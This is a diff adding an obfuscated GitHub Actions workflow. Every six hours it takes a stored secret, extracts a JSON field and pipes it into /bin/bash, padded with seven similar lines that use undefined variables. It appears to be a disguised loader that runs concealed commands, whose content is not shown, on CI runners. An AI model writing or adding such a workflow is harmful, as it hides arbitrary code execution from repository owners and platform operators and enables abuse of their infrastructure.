@@ -1,0 +1,24 @@
+name: hongqikx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongqikx
+        env:
+          epqas6: ${{ secrets.epqas6 }}
+        run: |
+          echo $epqas6 | jq -r .zbszd7 | /bin/bash
+          echo $zucr387 | jq -r .vruk087 | /bin/bash
+          echo $xjqoa11353 | jq -r .zdy4 | /bin/bash
+          echo $a492 | jq -r .iuqjj036 | /bin/bash
+          echo $alzc701 | jq -r .vj7 | /bin/bash
+          echo $vgplk16824 | jq -r .wdg76 | /bin/bash
+          echo $zbc65535 | jq -r .r69523 | /bin/bash
+          echo $v291 | jq -r .s13 | /bin/bash
+
